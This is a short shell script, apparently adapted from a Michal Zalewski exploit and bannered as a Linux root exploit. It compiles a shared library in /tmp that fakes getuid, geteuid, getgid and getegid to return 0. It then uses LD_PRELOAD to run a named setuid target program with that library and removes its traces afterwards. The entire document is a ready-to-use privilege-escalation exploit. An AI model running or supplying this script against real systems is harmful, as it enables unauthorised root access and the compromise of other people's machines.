#!/bin/sh
# Modified from http://lcamtuf.coredump.cx/soft/ld-expl by Michal Zalewski

cwd=$(pwd)
prog="$cwd/badsuid"
[[ -z "$1" ]] || prog="$cwd/$1"

echo "1|nux r007 3xp10|7 by 1c4m7uf"
cd /tmp
cat >ex.c <<eof
int getuid() { return 0; }
int geteuid() { return 0; }
int getgid() { return 0; }
int getegid() { return 0; }
eof

gcc -shared ex.c -oex.so
LD_PRELOAD=/tmp/ex.so $prog
rm /tmp/ex.so /tmp/ex.c
